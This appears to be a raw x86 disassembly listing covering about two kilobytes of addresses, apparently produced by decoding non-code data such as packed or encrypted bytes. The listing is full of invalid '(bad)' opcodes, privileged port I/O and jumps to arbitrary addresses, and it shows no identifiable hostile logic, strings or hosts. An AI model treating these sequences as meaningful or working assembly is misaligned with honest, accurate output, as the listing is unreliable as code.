  419b62:	adc    DWORD PTR [eax],0xffffffeb
  419b65:	pop    ebx
  419b66:	add    BYTE PTR [esi-0x4e],bl
  419b69:	sbb    DWORD PTR ds:0x71615a00,eax
  419b6f:	mov    eax,0x1fe6754
  419b74:	xor    eax,eax
  419b76:	add    DWORD PTR [eax],eax
  419b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b79:	and    ch,BYTE PTR [eax+0x9]
  419b7c:	retf   0x8ab6
  419b7f:	xchg   BYTE PTR [edi+0xefffda7],ah
  419b85:	es adc eax,0x405ba704
  419b8b:	mov    DWORD PTR [ecx],eax
  419b8d:	rol    BYTE PTR [ecx],0x0
  419b90:	xchg   edi,eax
  419b91:	adc    DWORD PTR es:[eax],0x6b
  419b95:	pop    ebx
  419b96:	add    BYTE PTR [ebx+0x1b6d9],cl
  419b9c:	push   edi
  419b9d:	and    DWORD PTR ds:0x2,ecx
	...
  419bc7:	add    BYTE PTR [eax],al
  419bc9:	add    BYTE PTR [ebp+0x7788bf60],ah
  419bcf:	pop    esp
  419bd0:	mov    ds,WORD PTR [ebx+ebx*2]
  419bd3:	pop    ebx
  419bd4:	add    BYTE PTR [ebp+0x6e],dh
  419bd7:	and    al,BYTE PTR [ebx+0x5b5b10]
  419bdd:	mov    DWORD PTR [ecx+0x270001b7],ebp
  419be3:	fwait
  419be4:	mov    BYTE PTR [esi-0x24fc2],ch
  419bea:	and    DWORD PTR [esi+edi*2],edi
  419bed:	cmovb  esi,DWORD PTR [ecx+eax*1-0x2434775]
  419bf5:	dec    DWORD PTR [ecx]
  419bf7:	cmp    esi,esp
  419bf9:	add    esp,ebp
  419bfb:	ss inc edx
  419bfd:	xchg   DWORD PTR [esi-0x4d],ecx
  419c00:	jae    0x419c1d
  419c02:	cmp    dh,BYTE PTR [ecx+eax*1+0x7e394775]
  419c09:	(bad)  
  419c0c:	add    DWORD PTR [ecx-0x24340],ecx
  419c12:	shl    esp,1
  419c14:	jp     0x419bc3
  419c16:	sub    bh,BYTE PTR [eax+0x3eb70001]
  419c1c:	hlt    
  419c1d:	add    edi,DWORD PTR [esi]
  419c1f:	mov    ah,0x78
  419c21:	test   DWORD PTR [esi-0x40],edx
  419c24:	add    DWORD PTR [eax],eax
  419c26:	mov    ah,0xbc
  419c28:	dec    eax
  419c2a:	mov    al,ds:0xd67773
	...
  419c57:	add    BYTE PTR [ebp+0x47],bl
  419c5a:	jl     0x419c63
  419c5c:	in     al,dx
  419c5d:	sub    BYTE PTR [esi],dh
  419c5f:	out    0x67,eax
  419c61:	mov    al,0x4
  419c63:	(bad)  
  419c64:	mov    ch,0x7d
  419c66:	jg     0x419c47
  419c68:	inc    edx
  419c69:	fs ja  0x419c39
  419c6c:	data16 clc 
  419c6e:	add    eax,0x343969fe
  419c73:	sbb    BYTE PTR [edi-0x4e],0xb2
  419c77:	mov    cl,BYTE PTR [eax+0x51fb448c]
  419c7d:	in     eax,0x80
  419c7f:	out    0x3f,al
  419c81:	inc    ebp
  419c82:	ja     0x419c51
  419c84:	push   esi
  419c85:	xor    BYTE PTR ds:0x465b39fe,al
  419c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c8c:	xchg   edx,eax
  419c8d:	cdq    
  419c8e:	out    dx,eax
  419c8f:	add    edi,DWORD PTR [ebp-0x4ffd696d]
  419c95:	inc    esi
  419c96:	jecxz  0x419c9b
  419c98:	fcom   DWORD PTR ds:[eax]
  419c9b:	sti    
  419c9c:	mov    al,BYTE PTR [edx+esi*2+0x7d]
  419ca0:	cmp    DWORD PTR [edi-0x19],ebx
  419ca3:	add    esi,DWORD PTR [edi-0x6003024]
  419ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cab:	jp     0x419c50
  419cad:	inc    esi
  419cae:	jecxz  0x419cb3
  419cb0:	ds aam 0x6d
  419cb3:	repz cmp eax,0xc378e75b
  419cb9:	inc    edx
  419cba:	jmp    0x419cbf
	...
  419ce4:	add    BYTE PTR [eax],al
  419ce6:	ds rcl edi,1
  419ce9:	add    esp,ebp
  419ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cec:	sub    DWORD PTR [ebx+0x31],edi
  419cef:	pop    esp
  419cf0:	pop    ebp
  419cf1:	out    0x3d,eax
  419cf3:	pop    ebx
  419cf4:	out    0x8e,eax
  419cf6:	push   esi
  419cf7:	shl    BYTE PTR [ebp-0xd],cl
  419cfa:	cmp    eax,0xbb7ae75b
  419cff:	inc    edx
  419d00:	jecxz  0x419d05
  419d02:	sbb    esi,DWORD PTR ds:[eax+0x55]
  419d06:	xor    eax,0xb703e75f
  419d0b:	(bad)  
  419d0d:	inc    DWORD PTR [ecx+0x517d62a5]
  419d13:	pop    edi
  419d14:	out    0x3,eax
  419d16:	les    ecx,FWORD PTR [edx-0x17]
  419d19:	aad    0x68
  419d1b:	cwde   
  419d1c:	pop    edi
  419d1d:	adc    al,0x61
  419d1f:	xlat   BYTE PTR ds:[ebx]
  419d20:	jmp    0x419d29
  419d22:	ds pop ebx
  419d24:	cmp    al,0x1d
  419d26:	(bad)  
  419d27:	(bad)  
  419d29:	pop    es
  419d2a:	ds pop ebx
  419d2c:	add    BYTE PTR [eax-0x4c],ah
  419d2f:	inc    edx
  419d30:	add    al,0xe9
  419d32:	cmp    eax,0x5e57871b
  419d37:	pop    edi
  419d38:	add    cl,ch
  419d3a:	mov    edx,0x3ded10dd
  419d3f:	pop    ebx
  419d40:	mov    DWORD PTR [edi+0x3a],esp
  419d43:	pop    edi
  419d44:	add    cl,ch
  419d46:	ret    
  419d47:	dec    ebx
  419d48:	add    bl,BYTE PTR [ebx+0x0]
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	cmp    al,0x98
  419d76:	mov    cl,bl
  419d78:	cmp    dl,ch
  419d7a:	sbb    al,0xe5
  419d7c:	cmp    eax,0xc100735b
  419d81:	fst    QWORD PTR [eax]
  419d83:	in     eax,0x3d
  419d85:	pop    ebx
  419d86:	xchg   DWORD PTR [edi+0x42],ebp
  419d89:	pop    edi
  419d8a:	add    cl,ch
  419d8c:	jge    0x419d6a
  419d8e:	scas   al,BYTE PTR es:[edi]
  419d8f:	in     eax,0x39
  419d91:	pop    ebx
  419d92:	add    BYTE PTR [eax-0x4c],dh
  419d95:	dec    ebx
  419d96:	add    al,0xe9
  419d98:	cmp    eax,0x41d186d2
  419d9d:	pop    ebx
  419d9e:	add    BYTE PTR [ecx],bh
  419da0:	pop    edx
  419da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da2:	mov    edi,ebp
  419da4:	inc    ecx
  419da5:	pop    ebx
  419da6:	add    BYTE PTR [edx+eax*2+0x41f986d2],bl
  419dad:	pop    ebx
  419dae:	add    BYTE PTR [eax-0x3c],dh
  419db1:	inc    ebx
  419db2:	add    al,0xe9
  419db4:	cmp    eax,0x5e47871b
  419db9:	pop    edi
  419dba:	add    cl,ch
  419dbc:	retf   0x10dd
  419dbf:	in     eax,dx
  419dc0:	cmp    eax,0x4567895b
  419dc5:	pop    edi
  419dc6:	add    cl,ch
  419dc8:	lea    edi,[ebx-0x1]
  419dcb:	pop    esi
  419dcc:	cmp    DWORD PTR [edi+0x0],ebx
  419dcf:	add    BYTE PTR [edi+0x23],ah
  419dd2:	adc    eax,0x447e18b
	...
  419dff:	add    BYTE PTR [eax],al
  419e01:	add    BYTE PTR [edi-0x29],dl
  419e04:	xchg   BYTE PTR [eax],bl
  419e06:	and    ebx,DWORD PTR [eax+0x0]
  419e09:	inc    eax
  419e0a:	scas   al,BYTE PTR es:[edi]
  419e0b:	jmp    0x8685:0x5817041c
  419e12:	daa    
  419e13:	pop    esp
  419e14:	add    BYTE PTR [eax],al
  419e16:	pushf  
  419e17:	rcr    BYTE PTR [eax],cl
  419e19:	add    al,0x27
  419e1b:	pop    eax
  419e1c:	shl    BYTE PTR [eax],1
  419e1e:	push   ss
  419e1f:	retf   0x41c
  419e22:	pop    ss
  419e23:	pop    eax
  419e24:	jno    0x419e3f
  419e26:	pop    esp
  419e27:	rcl    BYTE PTR [eax],cl
  419e29:	add    al,0xe7
  419e2b:	push   edi
  419e2c:	test   DWORD PTR [esi+0x533f],eax
  419e32:	xchg   edi,eax
  419e33:	(bad)  
  419e34:	scas   al,BYTE PTR es:[edi]
  419e35:	sbb    al,0xe3
  419e37:	push   edi
  419e38:	add    BYTE PTR [ecx+0x44861],cl
  419e3e:	xlat   BYTE PTR ds:[ebx]
  419e3f:	aam    0xb6
  419e41:	sbb    bl,dl
  419e43:	push   edi
  419e44:	add    al,dl
  419e46:	inc    ecx
  419e47:	cmp    DWORD PTR [ecx-0x3e],ebx
  419e4a:	scas   eax,DWORD PTR es:[edi]
  419e4b:	push   edi
  419e4c:	xchg   DWORD PTR [ebx+eax*4+0x5b],eax
  419e50:	push   esi
  419e51:	push   edi
  419e52:	sbb    al,0x24
  419e54:	and    al,0x10
  419e56:	sbb    al,0xaf
  419e58:	cmp    DWORD PTR [eax+0x730057a7],eax
  419e5e:	imul   ebx,esp,0xfffffffb
  419e61:	add    al,0x4
  419e63:	inc    ecx
  419e64:	aaa    
  419e65:	xchg   BYTE PTR [eax],al
	...
  419e8f:	add    BYTE PTR [ebx+0x1300005b],al
  419e95:	add    esi,ebx
  419e97:	fdivr  DWORD PTR [edi+ebx*4]
  419e9a:	jg     0x419e7c
  419e9c:	ds mov ah,0x60
  419e9f:	cmp    DWORD PTR [esi-0x42],0xb246c25f
  419ea6:	cmp    al,0x86
  419ea8:	and    bh,BYTE PTR [esi-0x5135ffff]
  419eae:	cmp    BYTE PTR ds:[esi],0xb4
  419eb2:	add    DWORD PTR [ecx+0x3b],esi
  419eb5:	xor    eax,0xa51502ef
  419eba:	add    BYTE PTR ds:[ebx],bh
  419ebd:	mov    ah,0x1
  419ebf:	jb     0x419f00
  419ec1:	inc    ecx
  419ec2:	cmp    eax,0x1b49300
  419ec7:	jb     0x419f08
  419ec9:	jno    0x419e8c
  419ecb:	call   0xc0c4e406
  419ed0:	cmp    eax,0xf426ec44
  419ed5:	cmp    edi,edi
  419ed7:	push   ebp
  419ed8:	mov    ch,0x72
  419eda:	mov    ebx,eax
  419edc:	(bad)  
  419edd:	test   al,0xfb
  419edf:	std    
  419ee0:	fcos   
  419ee2:	inc    edi
  419ee3:	sbb    BYTE PTR [ebp+edi*8+0x60],al
  419ee7:	pop    esi
  419ee8:	cld    
  419ee9:	lods   al,BYTE PTR ds:[esi]
  419eea:	add    DWORD PTR [ebp-0x2a],edx
  419eed:	mov    eax,0xd1b9fdfb
  419ef2:	test   al,al
	...
  419f1c:	add    BYTE PTR [eax],al
  419f1e:	cmp    bl,BYTE PTR [edx-0x1ac1f73d]
  419f24:	mov    WORD PTR [edx+ebx*2-0x44],ds
  419f28:	push   esi
  419f29:	push   esi
  419f2a:	lds    eax,FWORD PTR [ebx-0x7d]
  419f2d:	mov    esi,0x1b066
  419f32:	ds leave 
  419f34:	adc    BYTE PTR [ebp+eiz*1-0x40fffe4d],al
  419f3b:	lods   eax,DWORD PTR ds:[esi]
  419f3c:	add    DWORD PTR [eax],0x74e75b3e
  419f42:	sub    esi,ebx
  419f44:	pop    ebx
  419f45:	sub    BYTE PTR [esi+0x57],al
  419f48:	pop    edx
  419f49:	ds pushw 0xffd2
  419f4d:	add    BYTE PTR [eax-0x2a],dl
  419f50:	mov    ch,0xeb
  419f52:	push   cs
  419f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f54:	mov    esi,0xbf91b400
  419f59:	std    
  419f5a:	xor    al,0xa2
  419f5c:	scas   al,BYTE PTR es:[edi]
  419f5d:	lea    edi,[edx+0x77]
  419f60:	dec    DWORD PTR [eax+edx*8+0x3e03e34a]
  419f67:	aad    0xa2
  419f69:	daa    
  419f6a:	sbb    DWORD PTR [eax+eiz*4+0x5],ebx
  419f6e:	rol    DWORD PTR [ecx],1
  419f70:	outs   dx,DWORD PTR ds:[esi]
  419f71:	add    eax,0x7d7d90b
  419f76:	ds pop ebx
  419f78:	pusha  
  419f79:	mov    eax,ds:0x3e75722
  419f7e:	nop
  419f7f:	add    dl,al
  419f81:	lds    eax,FWORD PTR [eax]
	...
  419fab:	add    BYTE PTR [esi],dh
  419fad:	pop    ebx
  419fae:	push   0xffffffd0
  419fb0:	jecxz  0x41a00d
  419fb2:	xchg   ebp,eax
  419fb3:	pop    ds
  419fb4:	inc    edx
  419fb5:	pop    ebx
  419fb6:	out    0x8e,eax
  419fb8:	arpl   WORD PTR [esp+edi*4+0x1a],dx
  419fbc:	mov    bh,0xd8
  419fbe:	xlat   BYTE PTR ds:[ebx]
  419fbf:	pop    es
  419fc0:	ds pop ebx
  419fc2:	pusha  
  419fc3:	mov    DWORD PTR [esi+0x57],edx
  419fc6:	out    0x3,eax
  419fc8:	(bad)  
  419fc9:	rcl    DWORD PTR [ebp+0x1f],cl
  419fcc:	inc    edx
  419fcd:	pop    ebx
  419fce:	out    0x8a,eax
  419fd0:	mov    eax,0x3e03eb4a
  419fd5:	(bad)  
  419fd6:	sbb    edi,DWORD PTR gs:[edx]
  419fd9:	pop    ebx
  419fda:	out    0x8d,eax
  419fdc:	ss pop ebp
  419fde:	xor    BYTE PTR [ecx],al
  419fe0:	jle    0x419fb4
  419fe2:	add    cl,ah
  419fe4:	cmp    al,0xe1
  419fe6:	sbb    al,0xe5
  419fe8:	cmp    eax,0xb500735b
  419fed:	fcom   DWORD PTR [eax]
  419fef:	in     eax,0x3d
  419ff1:	pop    ebx
  419ff2:	xchg   DWORD PTR [edi+0x3a],ebp
  419ff5:	push   edi
  419ff6:	add    cl,ch
  419ff8:	std    
  419ff9:	fldcw  WORD PTR [esi+0x5b41e5]
  419fff:	jo     0x419fb9
  41a001:	dec    edx
  41a002:	add    al,0xe9
  41a004:	cmp    eax,0x39d186d2
  41a009:	pop    ebx
  41a00a:	add    BYTE PTR [ecx-0x572e2d9e],bh
	...
  41a038:	add    BYTE PTR [eax],al
  41a03a:	adc    al,0x54
  41a03c:	sub    DWORD PTR [ebx-0x6076f2c4],0x86fa9922
  41a046:	or     ebx,edx
  41a048:	xchg   cl,bl
  41a04a:	cmp    DWORD PTR [ebx+0x0],ebx
  41a04d:	popa   
  41a04e:	pop    edx
  41a04f:	jecxz  0x41a050
  41a051:	call   0x6f40fb93
  41a056:	push   edx
  41a057:	push   edi
  41a058:	add    cl,ch
  41a05a:	mov    dl,0xc1
  41a05c:	and    al,0xed
  41a05e:	cmp    eax,0xba527f5b
  41a063:	pop    ebx
  41a064:	add    cl,ch
  41a066:	dec    esp
  41a067:	inc    ebx
  41a068:	or     ebp,0x62024319
  41a06e:	push   cs
  41a06f:	ja     0x41a089
  41a071:	cwde   
  41a072:	les    edx,FWORD PTR [ecx-0x615b8118]
  41a078:	std    
  41a079:	mov    esi,0x2b590403
  41a07e:	dec    edx
  41a07f:	pop    ebx
  41a080:	jg     0x41a094
  41a082:	cmp    bl,BYTE PTR [eax+eax*1+0x0]
  41a086:	xchg   edi,eax
  41a087:	sub    al,BYTE PTR [ecx+ebp*1]
  41a08a:	fstp   TBYTE PTR [eax+0x18]
  41a08d:	sub    DWORD PTR [esp+ebx*2+0x79],0x42a6700
  41a095:	sub    DWORD PTR [ebx],ebx
  41a097:	jae    0x41a0b1
  41a099:	mov    edx,DWORD PTR [ebx]
  41a09b:	jae    0x41a0b5
  41a09d:	push   ecx
	...
  41a0c6:	add    BYTE PTR [eax],al
  41a0c8:	fmul   QWORD PTR [ebp-0x5e929318]
  41a0ce:	sti    
  41a0cf:	pop    edi
  41a0d0:	and    DWORD PTR [edx],edi
  41a0d2:	push   edi
  41a0d3:	ret    0x5c4f
  41a0d6:	ret    
  41a0d7:	xchg   BYTE PTR [edi],bh
  41a0d9:	push   ebx
  41a0da:	add    BYTE PTR [eax],al
  41a0dc:	es pop esp
  41a0de:	add    BYTE PTR [eax],al
  41a0e0:	xchg   esi,eax
  41a0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e2:	add    BYTE PTR [eax],0x17
  41a0e5:	pop    esp
  41a0e6:	outs   dx,DWORD PTR ds:[esi]
  41a0e7:	dec    ecx
  41a0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e9:	and    BYTE PTR [eax+ebx*1],ah
  41a0ec:	sbb    ebp,DWORD PTR ds:0x78a13b42
  41a0f2:	add    al,0x0
  41a0f4:	pop    ss
  41a0f5:	sub    BYTE PTR [edx],bh
  41a0f7:	call   0x3d42d9
  41a0fc:	pop    esp
  41a0fd:	mov    gs,eax
  41a0ff:	add    ebx,DWORD PTR [ebp-0x5f]
  41a102:	sti    
  41a103:	mov    edx,DWORD PTR [ecx]
  41a105:	mov    ah,0xc9
  41a107:	stc    
  41a108:	jo     0x41a0ab
  41a10a:	mov    al,BYTE PTR [ebx+edi*1+0x3f]
  41a10e:	xchg   DWORD PTR [esi+0x57e7],ecx
  41a114:	dec    ebp
  41a115:	lea    esp,[ecx+eax*1]
  41a118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a119:	mov    DWORD PTR [edx],eax
  41a11b:	ret    0xd3c0
  41a11e:	std    
  41a11f:	(bad)  
  41a120:	sbb    DWORD PTR [esp+eax*1+0x0],ecx
  41a124:	xchg   edi,eax
  41a125:	into   
  41a126:	sahf   
  41a127:	and    al,0x3e
  41a129:	scas   al,BYTE PTR es:[edi]
  41a12a:	add    DWORD PTR [eax],eax
	...
  41a154:	add    BYTE PTR [eax],al
  41a156:	lock out dx,al
  41a158:	pop    edx
  41a159:	ret    0xb236
  41a15c:	or     ch,0x81
  41a15f:	mov    dl,0xbb
  41a161:	sbb    al,0x42
  41a163:	mov    dl,0x1
  41a165:	mov    esp,ecx
  41a167:	mov    edx,0x2fb51778
  41a16c:	adc    al,0x4
  41a16e:	ds mov dl,0x8a
  41a171:	xchg   BYTE PTR [esi],dh
  41a173:	scas   al,BYTE PTR es:[edi]
  41a174:	add    DWORD PTR [eax],eax
  41a176:	(bad)  
  41a177:	cmp    ch,BYTE PTR [esi+0x1b2421c]
  41a17d:	xchg   DWORD PTR [eax+0x3e000581],edi
  41a183:	cmp    DWORD PTR [esi+0x1b43a18],eax
  41a189:	mov    cl,BYTE PTR [esi-0x4e]
  41a18c:	iret   
  41a18d:	(bad)  
  41a18e:	cld    
  41a18f:	sub    al,0x14
  41a191:	(bad)  
  41a192:	fld    TBYTE PTR [eax+0x473e0005]
  41a198:	sbb    DWORD PTR [ecx+0x584c0],ecx
  41a19e:	sub    eax,DWORD PTR ds:[esi+0x1b44218]
  41a1a5:	inc    eax
  41a1a6:	(bad)  
  41a1a7:	pop    esi
  41a1a8:	and    BYTE PTR [esi+edi*1],al
  41a1ab:	mov    ah,0x8a
  41a1ad:	xchg   BYTE PTR [esi-0x48],cl
  41a1b0:	add    DWORD PTR [eax],eax
  41a1b2:	lds    ebp,FWORD PTR [esi]
  41a1b4:	sbb    al,0x4
  41a1b6:	ds mov ah,0xd1
  41a1b9:	and    BYTE PTR [eax],al
	...
  41a1e3:	add    BYTE PTR ds:0x3e042836,al
  41a1e9:	mov    ah,0x75
  41a1eb:	jb     0x41a1b2
  41a1ed:	jno    0x41a1b0
  41a1ef:	call   0x205d33a
  41a1f4:	push   cs
  41a1f5:	pop    ebx
  41a1f6:	setbe  BYTE PTR [ecx-0x3776e162]
  41a1fd:	dec    ebx
  41a1fe:	jmp    0x41a203
  41a200:	ds shl eax,cl
  41a203:	mov    ebx,0x3e79e89
  41a208:	sbb    eax,0x5b3e07d7
  41a20e:	pusha  
  41a20f:	sahf   
  41a210:	sbb    dl,BYTE PTR [edi-0x19]
  41a213:	add    ebp,ecx
  41a215:	mov    eax,ds:0x5b3e0367
  41a21a:	pop    edx
  41a21b:	sbb    al,0xbf
  41a21d:	das    
  41a21e:	or     ebx,DWORD PTR [esp+edi*1]
  41a221:	shl    BYTE PTR [ebx],cl
  41a223:	sub    BYTE PTR [esi],ah
  41a225:	or     DWORD PTR [edx-0x33],esi
  41a228:	push   esi
  41a229:	aaa    
  41a22a:	sar    ah,0x3b
  41a22d:	(bad)  
  41a22e:	adc    al,0x5f
  41a230:	xchg   edi,eax
  41a231:	cdq    
  41a232:	fild   WORD PTR [ebx]
  41a234:	test   eax,0x3e06e7a2
  41a239:	pop    ebx
  41a23a:	sbb    DWORD PTR [eax],ecx
  41a23c:	popa   
  41a23d:	pop    ss
  41a23e:	retf   
  41a23f:	sbb    edx,DWORD PTR [ecx+0x3e7ee7a2]
  41a245:	pop    ebx
  41a246:	stc    
  41a247:	push   0x0
	...
  41a271:	add    BYTE PTR [ecx+0x17],bl
  41a274:	ret    
  41a275:	sbb    eax,edi
  41a277:	push   es
  41a278:	retf   
  41a279:	sbb    ecx,DWORD PTR [edx+edx*8-0x5bce1463]
  41a280:	data16 cld 
  41a282:	cmp    ebp,0xffffffbb
  41a285:	pop    eax
  41a286:	cld    
  41a287:	push   edx
  41a288:	out    0x2,eax
  41a28a:	nop
  41a28b:	ds jecxz 0x41a291
  41a28e:	ds sub al,ah
  41a291:	mov    BYTE PTR [eax+0x3e03e34a],bh
  41a297:	aam    0x0
  41a299:	outs   dx,DWORD PTR ds:[esi]
  41a29a:	push   ebp
  41a29b:	push   edi
  41a29c:	add    cl,ch
  41a29e:	std    
  41a29f:	aad    0xae
  41a2a1:	add    eax,0x70005b36
  41a2a6:	ret    
  41a2a7:	dec    edx
  41a2a8:	add    al,0xe9
  41a2aa:	cmp    eax,0x41f186d4
  41a2af:	pop    ebx
  41a2b0:	add    BYTE PTR [ecx],bl
  41a2b2:	pop    ebp
  41a2b3:	sahf   
  41a2b4:	mov    ebx,0x5b41dd
  41a2b9:	jl     0x41a30f
  41a2bb:	aam    0x86
  41a2bd:	fld    DWORD PTR [ecx+0x5b]
  41a2c0:	add    BYTE PTR [eax-0x44],dh
  41a2c3:	inc    edx
  41a2c4:	add    al,0xe9
  41a2c6:	cmp    eax,0x3687871b
  41a2cb:	push   edi
  41a2cc:	add    cl,ch
  41a2ce:	mov    edx,0x3ded10d4
  41a2d3:	pop    ebx
  41a2d4:	mov    DWORD PTR [edi+0x0],esp
	...
  41a2ff:	add    BYTE PTR [edx+0x57],bl
  41a302:	add    cl,ch
  41a304:	or     eax,0x5e15897c
  41a309:	inc    ebx
  41a30a:	push   edx
  41a30b:	jb     0x41a301
  41a30d:	mov    bl,0xd4
  41a30f:	mov    eax,ds:0x375d9f15
  41a314:	ja     0x41a318
  41a316:	ret    0x3de1
  41a319:	rol    BYTE PTR [ebp+ecx*8+0x1],cl
  41a31d:	rcl    BYTE PTR [eax-0x2639a17],cl
  41a323:	mov    dl,0xca
  41a325:	push   edi
  41a326:	add    al,0xe9
  41a328:	cmp    eax,0xb3721725
  41a32d:	dec    edi
  41a32e:	add    al,0xe9
  41a330:	cmp    eax,0x3edfbf62
  41a335:	jb     0x41a2f6
  41a337:	sub    edi,DWORD PTR [esi]
  41a339:	pop    ebx
  41a33a:	sub    DWORD PTR [eax],eax
  41a33c:	push   ss
  41a33d:	pop    edx
  41a33e:	add    BYTE PTR [eax-0x5a],ch
  41a341:	pop    eax
  41a342:	ret    0xa704
  41a345:	gs rol dl,0xa3
  41a349:	pop    eax
  41a34a:	jg     0x41a338
  41a34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a34d:	add    eax,0x3ccb8b51
  41a352:	and    BYTE PTR [esi+0x74],dl
  41a355:	jge    0x41a2de
  41a357:	icebp  
  41a358:	ror    bh,1
  41a35a:	pop    esp
  41a35b:	and    al,0x67
  41a35d:	iret   
  41a35e:	pop    esp
  41a35f:	and    al,0x5f
  41a361:	pop    edi
  41a362:	scas   al,BYTE PTR es:[edi]
  41a363:	or     BYTE PTR [eax],al
	...
  41a38d:	add    BYTE PTR [ebx+0x58],ah
  41a390:	add    BYTE PTR [edi],cl
  41a392:	aam    0xf3
  41a394:	add    BYTE PTR [eax],al
  41a396:	push   edi
  41a397:	lods   eax,DWORD PTR ds:[esi]
  41a398:	pop    es
  41a399:	(bad)  
  41a39a:	ret    
  41a39b:	cmp    al,0x0
  41a39d:	add    BYTE PTR [edi+0x58],ah
  41a3a0:	mov    DWORD PTR [ebx+eax*2+0x57],esp
  41a3a4:	xchg   DWORD PTR [esi-0x263ad],eax
  41a3aa:	stos   BYTE PTR es:[edi],al
  41a3ab:	rol    BYTE PTR [eax],1
  41a3ad:	push   0xc8375826
  41a3b2:	jno    0x41a3fc
  41a3b4:	xchg   DWORD PTR [esi-0x263d5],ecx
  41a3ba:	sbb    al,0x97
  41a3bc:	jbe    0x41a3c2
  41a3be:	cld    
  41a3bf:	xchg   esi,eax
  41a3c0:	out    0xb,eax
  41a3c2:	cld    
  41a3c3:	xchg   esi,eax
  41a3c4:	add    DWORD PTR [eax],eax
  41a3c6:	das    
  41a3c7:	push   esi
  41a3c8:	add    bl,ch
  41a3ca:	in     eax,0x64
  41a3cc:	ror    BYTE PTR [ebx+0x45059],0xd7
  41a3d3:	push   eax
  41a3d4:	mov    dh,0x11
  41a3d6:	call   0x4c42e9c4
  41a3db:	or     al,0x96
  41a3dd:	add    al,0x3e
  41a3df:	cmp    DWORD PTR ds:0x8b4bb58a,eax
  41a3e5:	or     al,0xb9
  41a3e7:	sub    BYTE PTR [edi+0x8],bh
  41a3ea:	inc    edx
  41a3eb:	mov    dl,0x1
  41a3ed:	or     eax,0xb60a81e8
	...
  41a41a:	add    BYTE PTR [eax],al
  41a41c:	(bad)  
  41a41d:	mov    dl,0x8e
  41a41f:	dec    esp
  41a420:	enter  0x8ead,0x96
  41a424:	inc    edx
  41a425:	mov    dh,0x1
  41a427:	add    bh,al
  41a429:	popf   
  41a42a:	test   BYTE PTR [edi+0x1b23f],dh
  41a430:	aas    
  41a431:	and    al,0xfd
  41a433:	add    edi,DWORD PTR [esi]
  41a435:	mov    dl,0x4
  41a437:	mov    es,WORD PTR [esi-0x52]
  41a43a:	add    DWORD PTR [eax],eax
  41a43c:	mov    ch,0x33
  41a43e:	std    
  41a43f:	add    edi,DWORD PTR [esi]
  41a441:	mov    dl,0x8c
  41a443:	enter  0x2c25,0x8
  41a447:	add    al,0x3e
  41a449:	mov    dl,0x82
  41a44b:	idiv   DWORD PTR [esi]
  41a44d:	sbb    al,BYTE PTR [ecx]
  41a44f:	add    al,cl
  41a451:	lods   al,BYTE PTR ds:[esi]
  41a452:	dec    ecx
  41a453:	xchg   eax,eax
  41a455:	mov    ch,bh
  41a457:	push   DWORD PTR [ecx]
  41a459:	mov    WORD PTR [edi+0x1844208],fs
  41a45f:	or     eax,0xfdf76ebc
  41a464:	sbb    DWORD PTR [esi],ecx
  41a466:	inc    eax
  41a467:	and    al,0x4e
  41a469:	cs add al,0x65
  41a46c:	aas    
  41a46d:	test   BYTE PTR [edx+eax*8],bh
  41a470:	mov    BYTE PTR [edx-0x2bddab76],cl
  41a476:	in     al,dx
  41a477:	pop    es
  41a478:	mov    ebp,0xc00d010c
  41a47d:	mov    esi,0x1
	...
  41a4aa:	ds pop ebx
  41a4ac:	div    BYTE PTR [ecx-0x4e11a483]
  41a4b2:	test   DWORD PTR [edx+eiz*2+0x40],ebx
  41a4b6:	rcr    BYTE PTR [edi+0x62],0x38
  41a4ba:	mov    dh,0x56
  41a4bc:	inc    edx
  41a4bd:	or     edx,eax
  41a4bf:	into   
  41a4c0:	call   0x6627e2c8
  41a4c5:	and    al,0x42
  41a4c7:	pop    ebx
  41a4c8:	out    0x86,eax
  41a4ca:	cmp    ch,BYTE PTR [edx+0x2e]
  41a4cd:	inc    eax
  41a4ce:	bound  esi,QWORD PTR [edi-0x19]
  41a4d1:	or     edi,DWORD PTR [esi]
  41a4d3:	pop    ebx
  41a4d4:	sar    BYTE PTR [esi-0x69daaf4],cl
  41a4da:	inc    edi
  41a4db:	xchg   esi,eax
  41a4dc:	jnp    0x41a50d
  41a4de:	(bad)
  41a4e1:	imul   esi,DWORD PTR [ecx-0x66],0xffffffb2
  41a4e5:	add    DWORD PTR [edx+0x5f],0x72e803e7
  41a4ec:	jb     0x41a46f
  41a4ee:	dec    edx
  41a4ef:	pop    edi
  41a4f0:	out    0x3,eax
  41a4f2:	pop    ss
  41a4f3:	xchg   ebx,eax
  41a4f4:	pop    ebp
  41a4f5:	add    BYTE PTR [edi],dl
  41a4f7:	xchg   ebx,eax
  41a4f8:	ret    0x1707
  41a4fb:	xchg   ebx,eax
  41a4fc:	push   0xe8033ec0
  41a501:	add    esp,DWORD PTR [edi]
  41a503:	pop    ebp
  41a504:	cli    
  41a505:	clc    
  41a506:	mov    bh,0x60
  41a508:	bound  esi,QWORD PTR [edi]
  41a50a:	out    0xe7,al
  41a50c:	jmp    0x41a516
	...
  41a536:	add    BYTE PTR [eax],al
  41a538:	push   edi
  41a539:	mov    al,ds:0x2f49cc1a
  41a53e:	retf   
  41a53f:	daa    
  41a540:	nop
  41a541:	pop    edi
  41a542:	pusha  
  41a543:	dec    edi
  41a544:	pop    edx
  41a545:	inc    edi
  41a546:	ret    0x4bfc
  41a549:	fistp  WORD PTR [ecx]
  41a54b:	add    edi,DWORD PTR [esi]
  41a54d:	pop    ebx
  41a54e:	add    BYTE PTR [edx+ecx*8+0x5a],ah
  41a552:	add    cl,ch
  41a554:	cmp    eax,0xa12cbe4
  41a559:	loop   0x41a5a7
  41a55b:	add    eax,0xd4c542e
  41a560:	push   ss
  41a561:	push   0x5b3d1385
  41a566:	add    BYTE PTR [edx+0x1],dh
  41a569:	aas    
  41a56a:	adc    BYTE PTR [ebx+0x41],dh
